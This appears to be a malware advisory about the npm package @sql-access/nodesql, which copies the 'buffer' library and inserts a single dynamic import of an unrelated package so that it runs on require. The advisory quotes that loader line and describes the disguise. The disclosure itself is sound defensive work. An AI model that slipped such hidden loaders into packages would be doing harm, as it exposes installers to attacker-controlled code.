summary: Disguised buffer fork smuggles dynamic import of unrelated @sqlite-node/createsql dependency on require
details: @sql-access/nodesql@1.1.7 ships index.js as a verbatim copy of the upstream `buffer` package (Feross Aboukhadijeh) with a single inserted top-level line: `var ins = import('@sqlite-node/createsql');`. The imported promise is assigned to `ins` and never used, so the only effect of the line is to trigger module-init side effects in `@sqlite-node/createsql` whenever any consumer does `require('@sql-access/nodesql')`. The package's stated purpose (a Buffer/SQL helper) provides no justification for loading an unrelated SQLite-themed dependency at module load. Identity mismatch reinforces the loader-shape: package.json names the package `@sql-access/nodesql`, README markets it as `bare-stream / Streaming data for JavaScript` (an unrelated OSS project), and the code body is the upstream `buffer` library verbatim. The author field is a throwaway and the scope has no reputation. The single novel line versus upstream `buffer` is the cross-package loader, which silently pulls attacker-controlled transitive code into any installer's dependency tree on require.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
